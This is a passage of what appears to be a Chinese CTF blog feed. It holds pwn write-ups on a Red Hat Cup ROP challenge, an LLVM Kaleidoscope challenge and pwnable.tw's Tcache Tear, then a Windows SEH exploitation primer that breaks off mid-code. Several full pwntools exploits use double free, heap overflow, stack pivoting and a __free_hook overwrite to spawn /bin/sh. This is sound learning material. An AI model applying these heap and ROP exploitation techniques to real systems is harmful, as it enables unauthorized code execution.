class="number">8</span>))</span><br><span class="line">    Delete(<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">19</span>)</span><br><span class="line">    Delete(<span class="number">17</span>)</span><br><span class="line">    Delete(<span class="number">17</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x60</span>,p64(<span class="number">0x60208d</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    Add(<span class="number">0x60</span>,<span class="string">'a\n'</span>)</span><br><span class="line">    Add(<span class="number">0x60</span>,<span class="string">'a\n'</span>)</span><br><span class="line">    Add(<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">3</span>+p64(elf.got[<span class="string">'puts'</span>])[:<span class="number">-1</span>]+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    fake_chunk = <span class="number">0x601ffa</span></span><br><span class="line">    Add(<span class="number">0x50</span>,<span class="string">'a\n'</span>)</span><br><span class="line">    Add(<span class="number">0x50</span>,<span class="string">'a\n'</span>)</span><br><span class="line">    Add(<span class="number">0x50</span>,<span class="string">'a\n'</span>)</span><br><span class="line">    Delete(<span class="number">18</span>)</span><br><span class="line">    Delete(<span class="number">19</span>)</span><br><span class="line">    Delete(<span class="number">17</span>)</span><br><span class="line">    Delete(<span class="number">17</span>)</span><br><span class="line">    Delete(<span class="number">7</span>)</span><br><span class="line">    Delete(<span class="number">8</span>)</span><br><span class="line">    Delete(<span class="number">9</span>)</span><br><span class="line">    Add(<span class="number">0x50</span>,p64(fake_chunk)+<span class="string">'\n'</span>)</span><br><span class="line">    Add(<span class="number">0x50</span>,<span class="string">'a\n'</span>)</span><br><span class="line">    Add(<span class="number">0x50</span>,<span class="string">'a\n'</span>)</span><br><span class="line">    Add(<span class="number">0x38</span>,<span class="string">'a\n'</span>)</span><br><span class="line">    Add(<span class="number">0x38</span>,<span class="string">'a\n'</span>)</span><br><span class="line">    Add(<span class="number">0x38</span>,<span class="string">'a\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">18</span>)</span><br><span class="line">    Delete(<span class="number">19</span>)</span><br><span class="line">    Delete(<span class="number">17</span>)</span><br><span class="line">    Delete(<span class="number">17</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Delete(<span class="number">8</span>)</span><br><span class="line">    Delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x58</span>,<span class="string">'a'</span>*<span class="number">14</span>+p64(elf.plt[<span class="string">'puts'</span>])[:<span class="number">-1</span>]+<span class="string">'\n'</span>)</span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    fake_chunk = <span class="number">0x602022</span></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x38</span>,p64(fake_chunk)+<span class="string">'\n'</span>)</span><br><span class="line">    Add(<span class="number">0x38</span>,<span class="string">'a\n'</span>)</span><br><span class="line">    Add(<span class="number">0x38</span>,<span class="string">'a\n'</span>)</span><br><span class="line">    Add(<span class="number">0x38</span>,<span class="string">'a'</span>*<span class="number">6</span>+p64(libc.sym[<span class="string">'printf'</span>])+p64(libc.sym[<span class="string">'alarm'</span>])+p64(libc.sym[<span class="string">'read'</span>])+p64(libc.sym[<span class="string">'__libc_start_main'</span>])+p64(libc.sym[<span class="string">'malloc'</span>])+p64(libc.sym[<span class="string">'system'</span>])+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice :\n"</span>)</span><br><span class="line">    p.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="红帽杯"><a href="#红帽杯" class="headerlink" title="红帽杯"></a>红帽杯</h2><h3 id="Three"><a href="#Three" class="headerlink" title="Three"></a>Three</h3><p>允许写三字节sc，跳到我们的输入地址栈迁移getshell</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'47.104.190.38'</span>,<span class="number">12001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    p_esp_add_esp_8_p = <span class="number">0x080bf282</span></span><br><span class="line">    p_eax = <span class="number">0x080c11e6</span></span><br><span class="line">    p_esp = <span class="number">0x080a9051</span></span><br><span class="line">    p_edx_ecx_ebx = <span class="number">0x08072fb1</span></span><br><span class="line">    syscall_ret = <span class="number">0x080738c0</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x08048c5b')</span></span><br><span class="line">    p.recvuntil(<span class="string">"Give me a index:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Three is good number,I like it very much!\n"</span>)</span><br><span class="line">    p.send(asm(<span class="string">'push ecx;jmp DWORD ptr[ecx]'</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"Leave you name of size:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">0x200</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"Tell me:"</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    payload = p32(p_esp_add_esp_8_p)+<span class="string">'a'</span>*<span class="number">8</span>+p32(p_eax)+p32(<span class="number">0xb</span>)+p32(p_edx_ecx_ebx)+p32(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    off = len(payload)</span><br><span class="line">    payload += p32(<span class="number">0x080f6cc0</span>+off+<span class="number">8</span>)+p32(syscall_ret)+<span class="string">"/bin/sh\00"</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h3 id="万花筒"><a href="#万花筒" class="headerlink" title="万花筒"></a>万花筒</h3><h4 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h4><p>一道llvm题目，赛后看了陆晨学长给的wp，是llvmcookbook的示例改的，toy语言，看Kaleidoscope这个名字应该就可以找到教程，gettok里定义了一些标识符，在划分语元的时候使用，这里有def、extern、if等。</p>
<p>我们定义一个与库函数名相同函数体为空的函数，第一次调用会报错<code>Error: Unknown unary operator</code>，之后可以成功调用到该库函数，学长给的wp通过泄露libc执行syetm(binsh_addr)，预期解是mmap一块区域，读入”/bin/sh”，之后system(map_addr)</p>
<h4 id="exp-py-2"><a href="#exp-py-2" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">"./pwn"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"ready&gt; "</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#mmap</span></span><br><span class="line">    cmd(<span class="string">"def mmap(a b c d e f);"</span>)</span><br><span class="line">    cmd(<span class="string">"mmap(0,0,0,0,0,0);"</span>)</span><br><span class="line">    cmd(<span class="string">"mmap("</span>+str(<span class="number">0x10000</span>)+<span class="string">","</span>+str(<span class="number">0x2000</span>)+<span class="string">",3,34,0,0);"</span>)</span><br><span class="line">    <span class="comment">#read</span></span><br><span class="line">    cmd(<span class="string">"def read(a b c);"</span>)</span><br><span class="line">    cmd(<span class="string">"read(0,0,0);"</span>)</span><br><span class="line">    cmd(<span class="string">"read(0,"</span>+str(<span class="number">0x10000</span>)+<span class="string">",8);"</span>)</span><br><span class="line">    p.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    <span class="comment">#system</span></span><br><span class="line">    cmd(<span class="string">"def system(a);"</span>)</span><br><span class="line">    cmd(<span class="string">"system(0);"</span>)</span><br><span class="line">    cmd(<span class="string">"system("</span>+str(<span class="number">0x10000</span>)+<span class="string">");"</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF writeup</category>
      </categories>
  </entry>
  <entry>
    <title>Tcache Tear</title>
    <url>/2020/09/03/tcache_tear/</url>
    <content><![CDATA[<h1 id="pwnable-tw-gt-Tcache-Tear"><a href="#pwnable-tw-gt-Tcache-Tear" class="headerlink" title="pwnable.tw-&gt;Tcache Tear"></a>pwnable.tw-&gt;Tcache Tear</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>花了两天，libc的泄露一直没想到思路，遂看了别人的writeup。终于在中午两点的时候成功了，纪念差点儿低血糖晕倒的清明假期。</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>函数主要有三个功能，Malloc、Free和Info。Malloc里可以malloc一个大小小于0xff的堆块，注意这里的get_input函数获取的输入大小为size-16,如果size为小于16的正数，得到的结果被转换为无符号整数参数就会产生堆溢出。此外这里存储malloc_chunk的地方只有一个，每当Malloc被调用，0x602088就会写入malloc_chunk_addr。<br>get_input函数没有什么特别的，这里注意一下使用的是__read_chk进行读取，这个函数跟read不一样的地方在于其参数有一个buf，用来标识缓存区大小，避免溢出。<br>free部分一是没有检验ptr是不是为释放过的指针，造成double free，二是没有将ptr的内容置为空，存在被泄露的风险。此外这里限制了free的次数，最多可以free 8次，目前看来也没什么好的办法把这个栈上的free_num修改掉</p>
<p><img src="/2020/09/03/tcache_tear/1.jpg" alt="main"></p>
<p><img src="/2020/09/03/tcache_tear/2.jpg" alt="Malloc"></p>
<p><img src="/2020/09/03/tcache_tear/3.jpg" alt="get_input"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里最重要的两个漏洞就是double free和堆溢出。如果是Glibc-2.23可以构造unlink或者double free。根据Libc.so的版本2.27(给执行权限直接执行即可看到版本)以及题目名，可以想到这里主要考察的是tcache漏洞的利用。关于tcache，p4nda师傅有一篇非常详尽的分析<br><a href="http://p4nda.top/2018/03/20/tcache/" target="_blank" rel="noopener">p4nda</a><br>其利用方法也比较多，这里由于有double free，我们可以通过tcache_dup去做，fastbin的检查机制是刚释放的堆块和之前的不同<br>而tcache没有类似的检查，直接释放即可。下面是具体的漏洞利用</p>
<h3 id="泄露Libc地址"><a href="#泄露Libc地址" class="headerlink" title="泄露Libc地址"></a>泄露Libc地址</h3><p>Malloc(0x60)一个堆块，Free()之后它被放入tcache_entry里，此时继续Free()，tcache_entry[i]有两个成员，均为第一个chunk的地址，此时Malloc(0x60,p64(addr))会将tcache_entry[i]的chunk分配出来，且fd指向的addr也进入了这个tcache_entry[i]，调用一次Malloc(0x60)得到第一个堆块，再调用一次Malloc(0x60)即可分配得到目标地址所在的堆块(注意在entry中存储的地址是chunk_addr+0x10，因此addr填的应当是希望分配到的chunk的地址+0x10)<br>根据上述原理，我们基本思路是在Name所在的0x20区域内构造一个unsortebin(其size&gt;0x408)，Free(unsoretd_bin)会使得其fd和bk通过Info泄露出来，fd = main_arena_add + 96，即可反推出libc_base。这里我们先Malloc(0x60)到name附近的一个fake_chunk，这个fake_chunk的地址是0x60203d(通过pwndbg的find_fake_fast)找到，之后在其中构造另一个fake chunk，其结构如下：<br>0x602050:prev_size,chunk_size(0x421)<br>0x602060:paddings<br>0x602070:paddings<br>0x602080:paddings，p64(0x602050)<br>如此，Free()的时候即可往0x602060处写入main_arena+96。但是注意这里__libc_free的时候对于chunk有检查，很重要的一点是这个chunk的next_chunk的prev_in_use位要置为1，因此在构造这个chunk之前，我们要先在0x602050+0x420处构造另一个fake_next_chunk以逃避检查(bss段页对齐因此肯定不会越界),这个chunk的结构如下：<br>0x602470:0,size(0x21)<br>0x602480:padding<br>0x602090:0x20,0x21<br>注意后面Next_chunk的后面也不能省略，因为free的时候会看这个chunk来确定next_chunk能不能unlink。<br>按照上述操作先后malloc(next_fake_chunk)和malloc(fake_unsorted_chunk)再Info()可以获得Libc_base</p>
<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><p>依然是相似的方法，用One_gadgets覆盖掉<strong>free_hook或者</strong>malloc_hook，这里我开始用<strong>malloc_hook发现one_gadgets的三个gadget条件均不满足，换成</strong>free_hook即可成功拿到shell</p>
<h3 id="待解疑惑"><a href="#待解疑惑" class="headerlink" title="待解疑惑"></a>待解疑惑</h3><p>第一次double free后通过Malloc(0x60)成功写入next_chunk，之后准备第二次double free的时候如果还是Malloc(0x60)再Free()，会发现此时的chunk没有进入tcache_entry，而是进了fastbin，这直接导致double free失败，若是Malloc(other_size_but_0x60)即可重新进tcache_entry，看了会代码也没想明白，打算明天问下p4nda学长</p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>调试了很久终于破案了。是这样的，malloc的时候会先执行tcache_get()函数，这函数是这样的。借用ctf-wiki的图，在堆初始化的时候会分配一块内存用来存储这样一个数据结构，本地调试的地址为0x603000，那么0x603010+0x5代表的就是counts[5]即0x60大小的堆块在tcache中的个数。问题就出在这个地方，在double free又malloc的时候，counts[5]已经被置为0，而malloc的时候并不会检查这个地方是不是0，直接-1变成了0xff，而tcache_put()之前会比较counts[5]和0x7，由于都是无符号整数，这个if进不去导致堆管理认为tcache已经满了，因此把它放进了fastbin，造成了后来double free的失败<br>ps:我调试的时候是比对着正常malloc、free过程看的汇编，p4nda师傅给了一个directory命令用来添加libc用来看C，感觉解锁了新世界大门2333</p>
<p><img src="/2020/09/03/tcache_tear/4.jpg" alt="tcache_prethread_struct"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]); <span class="comment">// 获得一个 chunk，counts 减一</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="comment">// 64</span></span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// 7</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./tcache_tear'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./tcache_tear'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    offset = <span class="number">0x3ebc40</span></span><br><span class="line">    gadgets = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line">    p = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10207</span>)</span><br><span class="line">    offset = <span class="number">0x3ebc40</span></span><br><span class="line">    gadgets = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Data:'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Info</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Name:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'wz'</span>)</span><br><span class="line">    Malloc(<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">8</span>)<span class="comment">#idx0</span></span><br><span class="line">    Free()</span><br><span class="line">    Free()</span><br><span class="line">    <span class="comment">#Malloc(0x60,p64(0x60203d))#idx0</span></span><br><span class="line">    Malloc(<span class="number">0x60</span>,p64(<span class="number">0x602470</span>))<span class="comment">#idx0</span></span><br><span class="line">    Malloc(<span class="number">0x60</span>,<span class="string">'c'</span>*<span class="number">8</span>)<span class="comment">#idx0</span></span><br><span class="line">    <span class="comment">## write the next chunk of unsorted bin chunk</span></span><br><span class="line">    Malloc(<span class="number">0x60</span>,p64(<span class="number">0x0</span>)+p64(<span class="number">0x21</span>)+<span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0x20</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    <span class="comment">#preapare for another double free</span></span><br><span class="line">    Malloc(<span class="number">0x70</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">    Free()</span><br><span class="line">    Free()</span><br><span class="line">    Malloc(<span class="number">0x70</span>,p64(<span class="number">0x60203d</span>))<span class="comment">#a fake chunk ahead of 0x602060(name)</span></span><br><span class="line">    Malloc(<span class="number">0x70</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">    <span class="comment">#Malloc(0x60,'a'*19+p64(0xfff7dcfa00000000)+p64(0x21)+'a'*0x10+p64(0x20)+p64(0x21)+'a'*8+p64(0x602060))#0x60203d</span></span><br><span class="line">    Malloc(<span class="number">0x70</span>,<span class="string">'a'</span>*<span class="number">19</span>+p64(<span class="number">0xfff7dcfa00000000</span>)+p64(<span class="number">0x421</span>)+<span class="string">'a'</span>*<span class="number">0x28</span>+p64(<span class="number">0x602060</span>))<span class="comment">#fake chunk</span></span><br><span class="line">    Free()<span class="comment">#unsorted bin leak</span></span><br><span class="line">    Info()</span><br><span class="line">    p.recvuntil(<span class="string">'Name :'</span>)</span><br><span class="line">    main_arena = u64(p.recv(<span class="number">8</span>))<span class="number">-96</span></span><br><span class="line">    libc_base = main_arena - offset</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    log.success(<span class="string">'free hook addr =&gt; '</span> + hex(free_hook))</span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">1</span>]</span><br><span class="line">    Malloc(<span class="number">0x80</span>,<span class="string">'1'</span>*<span class="number">8</span>)</span><br><span class="line">    Free()</span><br><span class="line">    Free()</span><br><span class="line">    Malloc(<span class="number">0x80</span>,p64(free_hook<span class="number">-0x10</span>))</span><br><span class="line">    Malloc(<span class="number">0x80</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">    log.success(<span class="string">'before hack'</span>)</span><br><span class="line">    Malloc(<span class="number">0x80</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+p64(shell_addr))</span><br><span class="line">    Free()</span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
  </entry>
  <entry>
    <title>winpwn</title>
    <url>/2020/12/24/winpwn/</url>
    <content><![CDATA[<h1 id="windows-pwn初探"><a href="#windows-pwn初探" class="headerlink" title="windows pwn初探"></a>windows pwn初探</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天跟着xxrw和lyyl学到了不少winpwn的知识，整理一下</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>checksec工具：</p>
<p><a href="https://github.com/trailofbits/winchecksec" target="_blank" rel="noopener">winchecksec</a></p>
<p><a href="https://github.com/Wenzel/checksec.py" target="_blank" rel="noopener">checksec</a></p>
<p>调试工具：</p>
<p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools" target="_blank" rel="noopener">windbg</a></p>
<p>windbg previewer</p>
<p><a href="https://github.com/Ex-Origin/win_server" target="_blank" rel="noopener">win_server</a></p>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>win_server监听某个程序，虚拟机中remote连接，raw_input()等待windbg attach之后再发送数据。</p>
<p>常用命令：</p>
<ol>
<li>bp [exe_name]+offset:断在offset处</li>
<li>bp pe_base+offset:断在offset处</li>
<li>lm:查看加载的dll及pe地址空间</li>
<li>u addr:查看addr处的代码</li>
<li>g:运行到断点</li>
<li>p:单步步过</li>
<li>t:单步步入</li>
<li>!address [target_addr]:查看target_addr所属的地址范围</li>
<li>dps [addr]:查看addr处开始的一段范围内的值，并且搜索出二进制对应的符号</li>
<li>s -d 0x0 l?0x7fffffff 0x12345678 全局搜索0x12345678<br>寻找gadget:</li>
</ol>
<p><code>ropper --file ./ntdll.dll --nocolor &gt; gadget</code></p>
<p>注意因为linux/win的汇编不同不可使用ROPGadget找gadget。</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ol>
<li>GS:类似canary</li>
<li>ASLR:地址随机化，但是只有开机的时候才会随机一次</li>
</ol>
<h3 id="windows异常处理机制"><a href="#windows异常处理机制" class="headerlink" title="windows异常处理机制"></a>windows异常处理机制</h3><p>scopeTable结构体中保存了<strong>try块相匹配的</strong>except,__finally的值，在main函数开始的入口就被压入到栈中。</p>
<p>在遇到异常时，先执行except_handler4函数，该函数首先将scope_table的地址同security_cookie异或得到实际地址，之后验证gs的值，满足要求后当try_level=0xfffffffe(-2)时，调用scope_table中的filter_func。</p>
<h2 id="HitbGsec-babystack"><a href="#HitbGsec-babystack" class="headerlink" title="HitbGsec-babystack"></a>HitbGsec-babystack</h2><h3 id="程序逻辑-amp-amp-漏洞利用"><a href="#程序逻辑-amp-amp-漏洞利用" class="headerlink" title="程序逻辑 &amp;&amp; 漏洞利用"></a>程序逻辑 &amp;&amp; 漏洞利用</h3><p>通过checksec可以看到SafeSEH关闭，ASLR开启，有GS保护。</p>
<p>程序开始会leak出main_addr和stack_addr，根据前者可以得到pe_base，后面任意地址读可以借此得到security_cookie的值(或者先leak gs再用gs异或ebp)。</p>
<p>程序最后有个后门，a,b被初始化为1，当a+b=3时触发后门，由于溢出不到a,b，因此后门实际触发不到，我们通过伪造scope_table来实现。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// eax</span></span><br><span class="line">  FILE *v4; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// ST38_4</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+20h] [ebp-C0h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+24h] [ebp-BCh]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-B4h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [esp+44h] [ebp-9Ch]</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+C8h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">  v3 = (FILE *)_acrt_iob_func(<span class="number">1</span>);</span><br><span class="line">  setvbuf(v3, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">  v4 = (FILE *)_acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">  setvbuf(v4, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"ouch! Do not kill me , I will tell you everything"</span>);</span><br><span class="line">  sub_401420(<span class="string">"stack address = 